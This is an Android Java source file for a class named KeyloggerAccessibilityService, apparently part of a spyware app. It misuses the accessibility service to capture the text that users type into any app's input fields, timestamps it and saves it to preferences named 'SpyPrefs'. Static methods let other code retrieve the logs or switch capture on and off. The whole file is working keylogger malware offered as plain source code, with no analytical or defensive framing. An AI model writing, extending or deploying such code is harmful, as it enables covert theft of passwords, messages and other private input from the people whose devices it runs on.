package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerAccessibilityService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    private static StringBuilder keyLogs = new StringBuilder();
    private static boolean isActive = false;
    private String lastText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isActive) return;
        
        try {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String text = getTextFromNode(source);
                    if (text != null && !text.equals(lastText)) {
                        String newChars = getNewCharacters(lastText, text);
                        if (newChars != null && !newChars.isEmpty()) {
                            logKeyPress(newChars);
                        }
                        lastText = text;
                    }
                    source.recycle();
                }
            } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String className = source.getClassName() != null ? source.getClassName().toString() : "";
                    if (className.contains("EditText")) {
                        logKeyPress("[CLICKED_ON_INPUT]");
                    }
                    source.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private String getTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.getText() != null) {
            return node.getText().toString();
        }
        return null;
    }

    private String getNewCharacters(String oldText, String newText) {
        if (oldText == null) return newText;
        if (newText == null) return null;
        
        if (newText.length() > oldText.length()) {
            return newText.substring(oldText.length());
        } else if (newText.length() < oldText.length()) {
            return "[DELETED]";
        }
        return null;
    }

    private void logKeyPress(String key) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = "[" + timestamp + "] " + key;
        
        keyLogs.append(logEntry).append("\n");
        
        // Save to SharedPreferences
        SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
        String existingLogs = prefs.getString("keylogs", "");
        prefs.edit().putString("keylogs", existingLogs + logEntry + "\n").apply();
        
        Log.d(TAG, "Key logged: " + key);
    }

    public static String getLogs() {
        String logs = keyLogs.toString();
        keyLogs.setLength(0);
        return logs.isEmpty() ? "No keylogs recorded yet." : logs;
    }

    public static void clearLogs() {
        keyLogs.setLength(0);
    }

    public static void setActive(boolean active) {
        isActive = active;
        if (!active) {
            keyLogs.setLength(0);
        }
        Log.d(TAG, "Keylogger active: " + active);
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        Log.d(TAG, "Accessibility service connected");
    }
}